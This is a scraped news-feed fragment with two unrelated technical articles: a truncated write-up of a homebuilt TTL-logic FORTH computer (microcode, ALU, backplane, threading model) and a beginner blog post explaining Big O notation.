This computer has no microprocessor.  The CPU is discrete TTL logic.
<p><img alt="Mark 1 FORTH Computer" src="http://www.aholme.co.uk/Mk1/IMG/Rack1_40.jpg" width="900" height="500">
</p><p>I bought my first TTL data book in 1979.
I was learning 6502 machine code at the time and dreamt of building a simple TTL CPU.
I sketched some circuit ideas; but that was as far as it went.
Now, 25 years later, I've finally done it!
Working evenings and weekends, the Mark 1 took a month to design, 4 months to build and a month to program.
Here's the result:</p><p>
<img alt="Recursive factorial demo" src="http://www.aholme.co.uk/Mk1/IMG/Factorial.gif" width="652" height="331">
</p><p>
<b><tt>Myself</tt></b> is a standard way to implement recursion in FORTH.
Even if you're not familiar with FORTH, if I tell you it's a stack-based language, and uses reverse polish notation (RPN), you might be able to figure out how this works.
</p><h3>Specification</h3>
<table>
<tbody><tr><td>Technology</td><td>TTL (HCMOS)</td></tr>
<tr><td>Clock</td><td>1 MHz</td></tr>
<tr><td>Data Bus</td><td>8-Bit</td></tr>
<tr><td>Address Bus</td><td>16-Bit</td></tr>
<tr><td>Software</td><td><a href="http://www.aholme.co.uk/FORTH.htm">fig-FORTH</a></td></tr>
</tbody></table>

<h3>System Overview</h3>
<p><img width="800" height="523" src="http://www.aholme.co.uk/Mk1/IMG/System.gif" alt="Block diagram"></p>

<table>
 <tbody><tr>
  <td>Module</td>
  <td>Width<br>(bits)</td>
  <td>Description</td>
  <td>Comments</td>
 </tr>
 <tr>
  <td><p>ALU</p></td>
  <td><p>8</p></td>
  <td><p>Arithmetic and logic unit</p></td>
  <td><small>
	The ALU data path is a bottleneck.
	It takes four clock cycles to load the inputs, set the ALU function, and read the result.
	This is the least satisfactory aspect of the whole design.
  </small></td>
 </tr>
 <tr>
  <td><p>OP</p></td>
  <td><p>8</p></td>
  <td><p>Operand register</p></td>
  <td rowspan="2"><small>
	OP is loaded into the uppermost 8 bits of ¬µPC.
	The lower 4 bits are reset to zero.
  </small></td>
 </tr>
 <tr>
  <td><p>¬µPC</p></td>
  <td><p>12</p></td>
  <td><p>Microcode program counter</p></td>
 </tr>
 <tr>
  <td><p>W</p></td>
  <td><p>16</p></td>
  <td><p>FORTH Working register</p></td>
  <td rowspan="2"><small>
	The 16-bit index registers, IP and W, support increment, decrement, and can address memory.
  </small></td>
 </tr>
 <tr>
  <td><p>IP</p></td>
  <td><p>16</p></td>
  <td><p>FORTH Instruction Pointer</p></td>
 </tr>
 <tr>
  <td><p>PSP</p></td>
  <td><p>8</p></td>
  <td><p>FORTH Parameter stack pointer</p></td>
  <td rowspan="2"><small>
	The stack pointers, RSP and PSP, are 8-bit up/down counters feeding the A1-A9 address inputs of the stack RAMs.
	The least significant address input (A0) selects the upper or lower byte.
	Logically, the stacks are 16-bits wide by 256 words deep.
	The FORTH word length is 16 bits.
  </small></td>
 </tr>
 <tr>
  <td><p>RSP</p></td>
  <td><p>8</p></td>
  <td><p>FORTH Return stack pointer</p></td>
 </tr>
 <tr>
  <td><p>Stack RAM</p></td>
  <td><p>16</p></td>
  <td><p>Dedicated stack RAM</p></td>
 </tr>
 <tr>
  <td><p>0</p></td>
  <td><p>8</p></td>
  <td><p>Force 00H on data bus</p></td>
 </tr>
</tbody></table>

<h3>¬µ-Instruction Format</h3>

<p>
The Mark 1 is a micro-programmed machine with a highly encoded "vertical" microcode.
The microinstruction (¬µ) is only 8-bits wide.
One normally thinks in terms of "horizontal" microcodes, which are wider and less encoded.
Some are very wide indeed.
The Mark 1 is more like a RISC processor.
</p>

<p>The 8-bit ¬µ-instruction (¬µ) is encoded as follows:</p>


<table>
<tbody><tr>
<td></td>
<td>¬µ7</td>
<td>¬µ6</td>
<td>¬µ5</td>
<td>¬µ4</td>
<td>¬µ3</td>
<td>¬µ2</td>
<td>¬µ1</td>
<td>¬µ0</td>
</tr>
<tr>
<td>Move LSB</td>
<td>0</td>
<td>0</td>
<td colspan="3">Source</td>
<td colspan="3">Destination</td>
</tr>
<tr>
<td>Move MSB</td>
<td>0</td>
<td>1</td>
<td colspan="3">Source</td>
<td colspan="3">Destination</td>
</tr>
<tr>
<td>Decrement</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td colspan="2">Register</td>
</tr>
<tr>
<td>Disable IRQ</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>Increment</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td colspan="2">Register</td>
</tr>
<tr>
<td>Enable IRQ</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>Jump Direct (zero page)</td>
<td>1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td colspan="4">Address</td>
</tr>
<tr>
<td>Set ALU function</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td colspan="4">Function</td>
</tr>
<tr>
<td>Jump Indirect (¬µPC‚ÜêOP*16)</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>Conditional skip</td>
<td>1</td>
<td>1</td>
<td colspan="2">Test</td>
<td colspan="4">Distance</td>
</tr>
</tbody></table>

<p>The source and destination fields of the move instructions are coded as follows:</p>

	<table>
	<tbody><tr><td></td><td>Destination</td><td>Source</td></tr>
	<tr><td>000</td><td>W</td><td>W</td></tr>
	<tr><td>001</td><td>IP</td><td>IP</td></tr>
	<tr><td>010</td><td>TOS</td><td>TOS</td></tr>
	<tr><td>011</td><td>R</td><td>R</td></tr>
	<tr><td>100</td><td>Memory[W]</td><td>Memory[W]</td></tr>
	<tr><td>101</td><td>OP</td><td>Memory[IP]</td></tr>
	<tr><td>110</td><td>ALU input A</td><td>Zero</td></tr>
	<tr><td>111</td><td>ALU input B</td><td>ALU output</td></tr>
	</tbody></table>

<small>TOS = Top of parameter stack; R = Top of return stack</small>

<p>The Mark 1 executes 1 ¬µ-instruction per clock cycle (1MHz).</p>

<p>Decoding is done centrally using 74HC138 1-of-8 decoders.
Decoded control signals are distributed via the back plane.
Simple gating is then required at card level to complete the decoding.</p>

<p>The conditional is a skip not a branch.
It inhibits loading of another ¬µ-instruction for a specified number of cycles if the test is true.
The skip distance is decremented to zero at which point normal execution resumes.</p>

<p>The "¬µPC‚ÜêOP*16" instruction (1011xxxx) a.k.a. XOP loads the uppermost 8-bits of the program counter (¬µPC) from the operand register.
It's a form of indirect jump.</p>

<p>The other jump instruction (1001xxxx) has a 4-bit operand and can only reach the first 16 bytes of the ¬µ-ROM.</p>

<p>
The 74181-based ALU requires 8 control signals.
These are decoded from the 4-bit ALU function field in the ¬µ-instruction using a 7x16 diode matrix ROM.
The shaded squares indicate positions where diodes are fitted:</p>

<table>
 <tbody><tr>
  <td>
  </td>
  <td>
  <p>OP</p>
  </td>
  <td>
  <p>S0</p>
  </td>
  <td>
  <p>S1</p>
  </td>
  <td>
  <p>S2</p>
  </td>
  <td>
  <p>S3</p>
  </td>
  <td>
  <p>M</p>
  </td>
  <td>
  <p>FLAG</p>
  </td>
  <td>
  <p>D6</p>
  </td>
  <td>
  <p>D7</p>
  </td>
 </tr>
 <tr>
  <td>0</td>
  <td>ADD</td>
  <td>1</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>H</td>
  <td>H</td>
 </tr>
 <tr>
  <td>1</td>
  <td>ADC</td>
  <td>1</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
  <td>L</td>
 </tr>
 <tr>
  <td>2</td>
  <td>SUB</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>L</td>
  <td>x</td>
  <td>L</td>
  <td>H</td>
 </tr>
 <tr>
  <td>3</td>
  <td>SBB</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>L</td>
  <td>H</td>
  <td>x</td>
  <td>L</td>
 </tr>
 <tr>
  <td>4</td>
  <td>ASL</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>H</td>
  <td>H</td>
 </tr>
 <tr>
  <td>5</td>
  <td>ROL</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
  <td>L</td>
 </tr>
 <tr>
  <td>6</td>
 </tr>
 <tr>
  <td>7</td>
 </tr>
 <tr>
  <td>8 (a)</td>
  <td>0&lt;</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>H</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>8 (b)</td>
  <td>A</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>9</td>
  <td>B</td>
  <td>0</td>
  <td>1</td>
  <td>0</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>10</td>
  <td>AND</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>11</td>
  <td>OR</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>12</td>
  <td>NOT</td>
  <td>0</td>
  <td>0</td>
  <td>0</td>
  <td>0</td>
  <td>H</td>
  <td>L</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>13</td>
  <td>XOR</td>
  <td>0</td>
  <td>1</td>
  <td>1</td>
  <td>0</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>14</td>
  <td>A=B</td>
  <td>1</td>
  <td>0</td>
  <td>0</td>
  <td>1</td>
  <td>H</td>
  <td>x</td>
  <td>x</td>
  <td>x</td>
 </tr>
 <tr>
  <td>15</td>
 </tr>
</tbody></table>

<p>The control signals are transmitted from the diode matrix to the ALU via the data bus.</p>
<p>M is hard-wired to ¬µ3.</p>
<p>D6 and D7 control the carry input as follows:</p>

<table>
 <tbody><tr>
  <td>D6</td>
  <td>D7</td>
  <td>Carry IN</td>
 </tr>
 <tr>
  <td>X</td>
  <td>L</td>
  <td>Previous carry OUT</td>
 </tr>
 <tr>
  <td>H</td>
  <td>H</td>
  <td>0</td>
 </tr>
 <tr>
  <td>L</td>
  <td>H</td>
  <td>1</td>
 </tr>
</tbody></table>

<p>FLAG selects sign or overflow testing.
Sign testing routes the most significant bit of the ALU result to the conditional test multiplexer.
Overflow testing required the addition of a quad-XOR gate.
The 74181 does not generate an overflow signal (the later 382 variant does).
This was not used in the end because FORTH implements signed comparison by testing the sign of the result after subtraction.</p>

<h3>Backplane</h3>

<p>The Mark 1 is housed in a 3U 19"
IEC297 sub-rack with a 64-way DIN 41612 backplane.
The bus layout is shown below.
The "A" row resembles a standard 8-bit microprocessor bus.
The "C" row carries the ¬µ-instruction and various decoded control signals.
The fully-bussed pins (1, 2, 31, &amp; 32) carry power supply and clocks.</p>

<table>
 <tbody><tr>
  <td colspan="3"><h2>A</h2></td>
  <td colspan="4"><h2>C</h2></td>
 </tr>
 <tr>
  <td><p>1</p></td>
  <td colspan="6"><p>+5V</p></td>
 </tr>
 <tr>
  <td><p>2</p></td>
  <td colspan="6"><p>CLK1</p></td>
 </tr>
 <tr>
  <td><p>3</p></td>
  <td><p>D0</p></td>
  <td rowspan="8"><h2>DATA</h2></td>
  <td><p>3</p></td>
  <td><p>¬µ0</p></td>
  <td colspan="2" rowspan="8"><h2>¬µ</h2>
  </td>
 </tr>
 <tr>
  <td>
  <p>4</p>
  </td>
  <td>
  <p>D1</p>
  </td>
  <td>
  <p>4</p>
  </td>
  <td>
  <p>¬µ1</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>5</p>
  </td>
  <td>
  <p>D2</p>
  </td>
  <td>
  <p>5</p>
  </td>
  <td>
  <p>¬µ2</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>6</p>
  </td>
  <td>
  <p>D3</p>
  </td>
  <td>
  <p>6</p>
  </td>
  <td>
  <p>¬µ3</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>7</p>
  </td>
  <td>
  <p>D4</p>
  </td>
  <td>
  <p>7</p>
  </td>
  <td>
  <p>¬µ4</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>8</p>
  </td>
  <td>
  <p>D5</p>
  </td>
  <td>
  <p>8</p>
  </td>
  <td>
  <p>¬µ5</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>9</p>
  </td>
  <td>
  <p>D6</p>
  </td>
  <td>
  <p>9</p>
  </td>
  <td>
  <p>¬µ6</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>10</p>
  </td>
  <td>
  <p>D7</p>
  </td>
  <td>
  <p>10</p>
  </td>
  <td>
  <p>¬µ7</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>11</p>
  </td>
  <td>
  <p>A0</p>
  </td>
  <td rowspan="16"><h2>ADDRESS</h2></td>
  <td>
  <p>11</p>
  </td>
  <td>
  <p>¬µ210=101</p>
  </td>
  <td colspan="2">
  <p>Dest=OP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>12</p>
  </td>
  <td>
  <p>A1</p>
  </td>
  <td>
  <p>12</p>
  </td>
  <td>
  <p>¬µ210=110</p>
  </td>
  <td colspan="2">
  <p>Dest=ALU A</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>13</p>
  </td>
  <td>
  <p>A2</p>
  </td>
  <td>
  <p>13</p>
  </td>
  <td>
  <p>¬µ210=111</p>
  </td>
  <td colspan="2">
  <p>Dest=ALU B</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>14</p>
  </td>
  <td>
  <p>A3</p>
  </td>
  <td>
  <p>14</p>
  </td>
  <td>
  <p>¬µ210=000</p>
  </td>
  <td colspan="2">
  <p>W</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>15</p>
  </td>
  <td>
  <p>A4</p>
  </td>
  <td>
  <p>15</p>
  </td>
  <td>
  <p>¬µ210=001</p>
  </td>
  <td colspan="2">
  <p>IP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>16</p>
  </td>
  <td>
  <p>A5</p>
  </td>
  <td>
  <p>16</p>
  </td>
  <td>
  <p>¬µ210=010</p>
  </td>
  <td>
  <p>Dest=TOS</p>
  </td>
  <td>
  <p>PSP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>17</p>
  </td>
  <td>
  <p>A6</p>
  </td>
  <td>
  <p>17</p>
  </td>
  <td>
  <p>¬µ210=011</p>
  </td>
  <td>
  <p>Dest=R</p>
  </td>
  <td>
  <p>RSP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>18</p>
  </td>
  <td>
  <p>A7</p>
  </td>
  <td>
  <p>18</p>
  </td>
  <td>
  <p>SRC=111</p>
  </td>
  <td colspan="2">
  <p>ALU</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>19</p>
  </td>
  <td>
  <p>A8</p>
  </td>
  <td>
  <p>19</p>
  </td>
  <td>
  <p>SRC=000</p>
  </td>
  <td colspan="2">
  <p>W</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>20</p>
  </td>
  <td>
  <p>A9</p>
  </td>
  <td>
  <p>20</p>
  </td>
  <td>
  <p>SRC=001</p>
  </td>
  <td colspan="2">
  <p>IP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>21</p>
  </td>
  <td>
  <p>A10</p>
  </td>
  <td>
  <p>21</p>
  </td>
  <td>
  <p>SRC=010</p>
  </td>
  <td colspan="2">
  <p>TOS</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>22</p>
  </td>
  <td>
  <p>A11</p>
  </td>
  <td>
  <p>22</p>
  </td>
  <td>
  <p>SRC=011</p>
  </td>
  <td colspan="2">
  <p>R</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>23</p>
  </td>
  <td>
  <p>A12</p>
  </td>
  <td>
  <p>23</p>
  </td>
  <td>
  <p>¬µ=1000xxxx</p>
  </td>
  <td colspan="2">
  <p>INC / DEC</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>24</p>
  </td>
  <td>
  <p>A13</p>
  </td>
  <td>
  <p>24</p>
  </td>
  <td>
  <p>¬µ=1001xxxx</p>
  </td>
  <td colspan="2">
  <p>JUMP #</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>25</p>
  </td>
  <td>
  <p>A14</p>
  </td>
  <td>
  <p>25</p>
  </td>
  <td>
  <p>¬µ=1010xxxx</p>
  </td>
  <td colspan="2">
  <p>ALU Function</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>26</p>
  </td>
  <td>
  <p>A15</p>
  </td>
  <td>
  <p>26</p>
  </td>
  <td>
  <p>¬µ=1011xxxx</p>
  </td>
  <td colspan="2">
  <p>JUMP OP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>27</p>
  </td>
  <td>
  <p>MR</p>
  </td>
  <td>
  <p>Memory Read</p>
  </td>
  <td>
  <p>27</p>
  </td>
  <td>
  <p>M@IP</p>
  </td>
  <td colspan="2">
  <p>Address = IP</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>28</p>
  </td>
  <td>
  <p>MW</p>
  </td>
  <td>
  <p>Memory Write</p>
  </td>
  <td>
  <p>28</p>
  </td>
  <td>
  <p>M@W</p>
  </td>
  <td colspan="2">
  <p>Address = W</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>29</p>
  </td>
  <td>
  <p>RESET</p>
  </td>
  <td>
  </td>
  <td>
  <p>29</p>
  </td>
  <td>
  <p>LO</p>
  </td>
  <td colspan="2">
  <p>LO-byte</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>30</p>
  </td>
  <td>
  <p>IRQ</p>
  </td>
  <td>
  </td>
  <td>
  <p>30</p>
  </td>
  <td>
  <p>HI</p>
  </td>
  <td colspan="2">
  <p>HI-byte</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>31</p>
  </td>
  <td colspan="6">
  <p>CLK2</p>
  </td>
 </tr>
 <tr>
  <td>
  <p>32</p>
  </td>
  <td colspan="6">
  <p>0V</p>
  </td>
 </tr>
</tbody></table>

<p>The clocks are in quadrature.
CLK1 <strike>rises</strike>falls at the beginning of the machine cycle.
CLK2 is used to generate write-enable signals for the RAM and I/O.</p>

<p>All control signals are active low.</p>

<h3>Microcode sequencer</h3>

<p>The sequencer has a 12-bit micro-program counter (¬µPC).
The uppermost 8-bits can be loaded from the OP Latch, effecting a jump to one of 256 microcode routines.
Each routine starts on a 16-byte ¬µ-page boundary.</p>

<p><img width="554" height="152" src="http://www.aholme.co.uk/Mk1/IMG/Sequencer.gif" alt="Sequencer block diagram"></p>

<p>Opcodes, the machine language of the macro-machine, are loaded into the OP latch from the data bus under
micro-program control.  They can be fetched from memory using one of the index registers as a program counter.
A simple <i>micro-interpreter</i> consists of the following 3 ¬µ-instructions:</p>
<div><pre>OP‚ÜêMemory[Index]     Load OP latch from memory
Index‚ÜêIndex+1        Increment "program counter"
¬µPC‚ÜêOP*16            Execute microcode routine
</pre></div>
<p>How do these 3 ¬µ-instructions get executed?
One possibility is to append them to the end of every ¬µ-routine.
A slower but more space-efficient option is to append a jump to them.
Mark 1 microcode has a jump specifically for this.</p>

<h3>Virtual machine</h3>
<p>It's possible to customise the the instruction set and thereby create a "virtual machine".</p>
<p>Opcodes can have zero, one, or more operands.  
The ¬µ-routines consume operands by incrementing the program counter.
During development, I used this two-operand POKE instruction to test the UART.
This expects a 16-bit address followed by a data byte:</p>
<div><pre>Poke:    Index.Lo ‚Üê Memory [PC]        ; Address LO
         PC ‚Üê PC+1
         Index.Hi ‚Üê Memory [PC]        ; Address HI
         PC ‚Üê PC+1
         Temp ‚Üê Memory [PC]            ; Data byte
         PC ‚Üê PC+1
         Memory [Index] ‚Üê Temp         ; Do the POKE
         Jump Next
</pre></div>
<p>The Mark 1 was designed to support the FORTH virtual machine.
The following FORTH primitives are micro-programmed:</p>

<tt>
EXIT LIT EXECUTE
BRANCH 0BRANCH (LOOP) (DO) U* U/ AND OR XOR LEAVE R&gt; &gt;R R 0= 0&lt; + D+
MINUS DMINUS OVER DROP SWAP DUP @ C@ ! C! (DOES)
</tt>

<h3>Forth model</h3>

<p>My original plan was to build a subroutine-threaded FORTH.  High-level definitions were to be called explicitly, primitives were to be compiled inline:</p>

<table>
<tbody><tr>
<td>
    <table>
    <tbody><tr><td><tt>: Foo  DUP SWAP DROP ;</tt></td></tr>
	<tr><td>&nbsp;</td></tr>
    <tr><td><tt>: Bar  OVER Foo ROT ;</tt></td></tr>
    </tbody></table>
</td>
<td>
    <table>
    <tbody><tr><td><tt>Foo:</tt></td><td><tt>DB OP_DUP, OP_SWAP, OP_DROP, OP_EXIT</tt></td></tr>
    <tr><td>&nbsp;</td></tr>
    <tr><td><tt>Bar:</tt></td><td><tt>DB OP_OVER, OP_CALL</tt></td></tr>
    <tr><td>&nbsp;</td><td><tt>DW Foo</tt></td></tr>
    <tr><td>&nbsp;</td><td><tt>DB OP_ROT, OP_EXIT</tt></td></tr>
    </tbody></table>
</td>
</tr>
</tbody></table>

<p>I abandoned this idea because most FORTHs use indirect threading and I wanted a full-featured standard FORTH with all the usual compiler facilities.
Many compiling words are tightly coupled to the indirectly threaded model.</p>

<p>Indirectly threaded code is a list of execution tokens.
An execution token is a code field address.
The code field is a pointer to machine code.
This presented a problem on the mark 1 because it has separate macro and micro address spaces.
What should go in the code field?
My solution was to shorten it to 1 byte and store the opcode:</p>

<table>
 <tbody><tr>
  <td>
  <p><br><b>Subroutine-threaded</b><br>&nbsp;</p>
  </td>
  <td>
  <p><br><b>Indirectly-threaded</b><br>&nbsp;</p>
  </td>
  <td>
  <p><br><b>Mark 1</b><br>&nbsp;</p>
  </td>
 </tr>



 <tr>
  <td>
    <pre>
 Foo:       DB OP_DUP
            DB OP_SWAP
            DB OP_DROP
            DB OP_EXIT

 Bar:       DB OP_OVER
            DB OP_CALL
            DW Foo
            DB OP_ROT
            DB OP_EXIT
	</pre>
  </td>
  <td>
    <pre>
 cfa_Foo:   DW Enter
 pfa_Foo:   DW cfa_DUP
            DW cfa_SWAP
            DW cfa_DROP
            DW cfa_Exit

 cfa_Bar:   DW Enter
 pfa_Bar:   DW cfa_OVER
            DW cfa_Foo
            DW cfa_ROT
            DW cfa_Exit

 cfa_Exit:  DW pfa_Exit
 pfa_Exit:  .. code ..

 cfa_DUP:   DW pfa_DUP
 pfa_DUP:   .. code ..
    </pre>
  </td>
  <td>
    <pre>
 cfa_Foo:   DB OP_ENTER
 pfa_Foo:   DW cfa_DUP
            DW cfa_SWAP
            DW cfa_DROP
            DW cfa_Exit

 cfa_Bar:   DB OP_ENTER
 pfa_Bar:   DW cfa_OVER
            DW cfa_Foo
            DW cfa_ROT
            DW cfa_Exit

 cfa_Exit:  DB OP_EXIT
 cfa_DUP:   DB OP_DUP
 cfa_SWAP:  DB OP_SWAP
    </pre>
  </td>
 </tr>
</tbody></table>

<p>In ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.aholme.co.uk/Mk1/Architecture.htm">http://www.aholme.co.uk/Mk1/Architecture.htm</a></em></p>]]>
            </description>
            <link>http://www.aholme.co.uk/Mk1/Architecture.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25803748</guid>
            <pubDate>Sat, 16 Jan 2021 17:35:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Big O Notation ‚Äì Explained as Easily as Possible]]>
            </title>
            <description>
<![CDATA[
Score 399 | Comments 142 (<a href="https://news.ycombinator.com/item?id=25803288">thread link</a>) | @optimalsolver
<br/>
January 16, 2021 | https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible | <a href="https://web.archive.org/web/*/https://thatcomputerscientist.com/big-o-notation-explained-as-easily-as-possible">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1610789606012/MGgIIOjkr.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><blockquote>
<p>If you want to learn the math involved with the Big O, read  <a target="_blank" href="https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time">Analysing Algorithms: Worst Case Running Time</a>.</p>
</blockquote>
<p>Data Structures and Algorithms is about solving problems efficiently. A bad programmer solves their problems inefficiently and a really bad programmer doesn't even know why their solution is inefficient. So, the question is, <em>How do you rank an algorithm's efficiency?</em></p>
<p>The simple answer to that question is the <strong>Big O Notation</strong>. How does that work? Let me explain!</p>
<p>Say you wrote a function which goes through every number in a list and adds it to a <em>total_sum</em> variable.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610785957976/1d53AER34.png?auto=compress" alt="Screenshot 2021-01-16 at 2.02.19 PM.png"></p>
<p>If you consider "addition" to be 1 operation then running this function on a list of 10 numbers will cost 10 operations, running it on a list of 20 numbers costs 20 operations  and similarly running it on a list of n numbers costs the <em>length of list</em> (n) operations.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610786373466/WWOOmyjH9.gif?auto=format,compress&amp;gif-q=60" alt="Screen Recording 2021-01-16 at 2.01.09 PM.gif"></p>
<p>Now let's assume you wrote another function that would return the first number in a list.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610786595803/WcObNzV40.png?auto=compress" alt="Screenshot 2021-01-16 at 2.09.39 PM.png"></p>
<p>Now, no matter how large this list is, this function will never cost more than one operation. Fairly, these two algorithms have different <strong>time complexity</strong> or <em>relationship between growth of input size and growth of operations executed</em>. We communicate these time complexities using <strong><em>Big O Notation</em></strong>.</p>
<blockquote>
<p>Big O Notation is a mathematical notation used to classify algorithms according to how their run time or space requirements grow as the input size grows.</p>
</blockquote>
<p>Referring to the complexities as <em>'<strong>n</strong>'</em>, common complexities (ranked from good to bad) are:</p>
<ul>
<li>Constant - <strong>O(1)</strong></li>
<li>Logarithmic <strong>O(log n)</strong></li>
<li>Linear - <strong>O(n)</strong></li>
<li>n log n - <strong>O(n log n)</strong></li>
<li>Quadratic - <strong>O(n¬≤)</strong></li>
<li>Exponential - <strong>O(2‚Åø)</strong></li>
<li>Factorial - <strong>O(n!)</strong></li>
</ul>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610787546688/SufUcCJVY.png?auto=compress" alt="Screenshot 2021-01-16 at 2.23.08 PM.png"></p>
<p>Our first algorithm runs in <em>O(n)</em>, meaning its operations grew in a linear relationship with the input size - in this case, the amount of numbers in the list. Our second algorithm is not dependent on the input size at all  - so it runs in constant time. 
Let's take a look at how many operations a program has to execute in function with an input size of <em>n = 5 vs n = 50</em>.</p>
<table>
<thead>
<tr>
<td></td><td>n = 5</td><td>n = 50</td></tr>
</thead>
<tbody>
<tr>
<td><strong>O(1)</strong></td><td>1</td><td>1</td></tr>
<tr>
<td><strong>O(log n)</strong></td><td>4</td><td>6</td></tr>
<tr>
<td><strong>O(n)</strong></td><td>5</td><td>50</td></tr>
<tr>
<td><strong>O(n log n)</strong></td><td>20</td><td>300</td></tr>
<tr>
<td><strong>O(n¬≤)</strong></td><td>25</td><td>2500</td></tr>
<tr>
<td><strong>O(2‚Åø)</strong></td><td>32</td><td>1125899906842624</td></tr>
<tr>
<td><strong>O(n!)</strong></td><td>120</td><td>3.0414093e+64</td></tr>
</tbody>
</table>
<p>It might not matter when the input is small, but this gap gets very dramatic as the input size increases. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610788579877/ejJP5RkiF.gif?auto=format,compress&amp;gif-q=60" alt="Screen Recording 2021-01-16 at 2.33.46 PM.gif"></p>
<p>If n were 10000, a function that runs in <em>log(n)</em> would only take 14 operations and a function that runs in <em>n!</em> would set your computer on fire!</p>
<p>For Big O Notation, we <em>drop constants</em> so <em>O(10.n)</em> and <em>O(n/10)</em> are both equivalent to <em>O(n)</em> because the graph is still linear. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610788828910/JYXeRjI-G.png?auto=compress" alt="Screenshot 2021-01-16 at 2.47.52 PM.png"></p>
<p>Big O Notation is also used for <strong>space complexity</strong>, which works the same way - <em>how much space an algorithm uses as n grows</em> or <em>relationship between growth of input size and growth of space needed</em>.</p>
<p>So, yeah! This has been the simplest possible explanation of the Big O Notation from my side and I hope you enjoyed reading this. If you found this information helpful, share it with your friends on different social media platforms and consider clicking that <strong>follow</strong> button up there, it really motivates me to write more.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1610858996126/xJu3di8Te.png?auto=compress" alt="Screenshot 2021-01-17 at 10.17.42 AM.png"></p>
<p>And If you REALLY liked the article, consider <a target="_blank" href="https://ko-fi.com/luciferreeves">buying me a coffee</a> üòä. If you have any suggestions or feedback, feel free to let me know that in the comments. </p>
<p><strong><em>Happy Programming!</em></strong></p>
